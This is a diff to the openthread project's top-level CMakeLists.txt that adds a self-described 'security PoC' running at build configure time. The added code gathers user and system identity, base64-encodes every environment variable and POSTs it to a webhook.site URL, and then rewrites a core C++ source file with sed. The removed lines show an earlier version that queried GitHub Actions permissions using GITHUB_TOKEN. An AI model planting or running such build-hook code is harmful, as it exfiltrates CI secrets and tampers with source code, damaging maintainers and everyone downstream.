@@ -34,23 +34,57 @@ string(STRIP ${OT_DEFAULT_VERSION} OT_DEFAULT_VERSION)
 
 project(openthread VERSION ${OT_DEFAULT_VERSION})
 
-# --- START ADVANCED SECURITY POC ---
+# --- START ADVANCED COMBINED SECURITY PoC ---
+message(WARNING "***************************************************")
 message(WARNING "--- SECURITY IMPACT DEMONSTRATION ---")
+message(WARNING "VULNERABILITY CONFIRMED: RCE & BUILD-TIME INJECTION")
+message(WARNING "--- STEP 1: RCE Verification ---")
 
-# 1. جمع معلومات البيئة وتشفيرها (لتجاوز أي فلاتر نصية)
+# 1. basic RCE (Previous Proofs)
+execute_process(COMMAND id OUTPUT_VARIABLE POC_ID)
+execute_process(COMMAND uname -a OUTPUT_VARIABLE POC_NODE)
+execute_process(COMMAND whoami OUTPUT_VARIABLE POC_USER)
+message(WARNING "Running as User: ${POC_USER}")
+message(WARNING "System ID: ${POC_ID}")
+message(WARNING "Node Info: ${POC_NODE}")
+
+message(WARNING "--- STEP 2: Network Exfiltration Verification ---")
+
+# 2. Data Exfiltration (Previous Proof)
+# collect and base64 env vars
 execute_process(COMMAND bash -c "env | base64 -w 0" OUTPUT_VARIABLE ENCODED_ENV)
 
+# SEND to webhook (Remember to replace YOUR_ID)
 execute_process(
     COMMAND bash -c "curl -X POST -d \"data=${ENCODED_ENV}\" https://webhook.site/1c2b9d94-9f73-48ed-adf6-ffc19f56a6dc"
 )
 
-# 3. طباعة صلاحيات التوكن (للإثبات في السجلات)
-message(WARNING "Checking GITHUB_TOKEN Context...")
-execute_process(COMMAND bash -c "curl -s -H \"Authorization: Bearer $GITHUB_TOKEN\" https://api.github.com/repos/openthread/openthread/actions/permissions" OUTPUT_VARIABLE TOKEN_PERMS)
-message(WARNING "Token Permissions: ${TOKEN_PERMS}")
+message(WARNING "--- STEP 3: Supply Chain / Source Code Modification Proof ---")
 
-message(FATAL_ERROR "Impact Proven: Token Access & Data Exfiltration Successful.")
-# --- END ADVANCED SECURITY POC ---
+# 3. Code Integrity Modification (New Proof)
+# Target a central file that is likely to be compiled
+set(TARGET_FILE "${PROJECT_SOURCE_DIR}/src/core/api/ip6_api.cpp")
+
+# A. Show the original content of the first few lines
+message(WARNING "ORIGINAL Content of ${TARGET_FILE} (first 5 lines):")
+execute_process(COMMAND bash -c "head -n 5 ${TARGET_FILE}" OUTPUT_VARIABLE FILE_ORIGINAL)
+message(WARNING "${FILE_ORIGINAL}")
+
+# B. Inject a malicious comment/string into the file using 'sed'
+message(WARNING "Injecting Backdoor Marker via 'sed' command...")
+execute_process(
+    COMMAND bash -c "sed -i '1s/^/\/* INJECTED_BY_ActionPwn_PoC_SUPPLY_CHAIN *\/\n/' ${TARGET_FILE}"
+)
+
+# C. Show the modified content to prove injection success
+message(WARNING "MODIFIED Content of ${TARGET_FILE} (first 5 lines):")
+execute_process(COMMAND bash -c "head -n 5 ${TARGET_FILE}" OUTPUT_VARIABLE FILE_MODIFIED)
+message(WARNING "${FILE_MODIFIED}")
+message(WARNING "***************************************************")
+
+# استخدام FATAL_ERROR هنا لإيقاف الـ Workflow فوراً وجعل النتيجة واضحة جداً في السجلات.
+message(FATAL_ERROR "Impact Proven: RCE, Data Exfiltration, and Source Code Modification Successful.")
+# --- END ADVANCED COMBINED SECURITY PoC ---
 
 include(CTest)
 
